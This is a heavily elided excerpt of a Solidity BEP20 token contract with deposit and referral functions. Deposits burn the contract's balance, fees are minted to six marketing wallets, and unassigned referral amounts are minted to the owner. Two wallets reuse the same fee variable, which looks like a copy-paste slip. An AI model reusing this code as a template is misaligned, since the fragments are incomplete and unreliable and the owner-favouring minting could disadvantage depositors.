    ...
    */
    ...
    receive() external payable{
     ...
     function directDeposit(address  _refBy, uint _amount) external{ 
        require(block.timestamp >= releaseTime, "not launched yet!");
        require(IBEP20(BLItoken).transferFrom(msg.sender, address(this), _amount),'Failed_Transfer');
        deposit(_amount, payable(msg.sender), _refBy);
    }

    function deposit(uint _amount, address payable _userId, address _refBy) internal {
        IBEP20 _token = IBEP20(BLItoken);
        IBEP20(BLItoken).burn(address(this), _token.balanceOf(address(this)));
        ...
        IBEP20(BLItoken).mint(marketing1, marketingfee1);
        IBEP20(BLItoken).mint(marketing2, marketingfee2);
        IBEP20(BLItoken).mint(marketing3, marketingfee3);
        IBEP20(BLItoken).mint(marketing4, marketingfee4);
        IBEP20(BLItoken).mint(marketing5, marketingfee4);
        IBEP20(BLItoken).mint(marketing6, marketingfee4);
    ...
    function distributeRef(uint256 _trx, address _affFrom) private{
     ...
     if(_allaff > 0 ){
            IBEP20(BLItoken).mint(owner, _allaff);
        }
    }
        ...
        IBEP20(BLItoken).mint(_userId, amount);
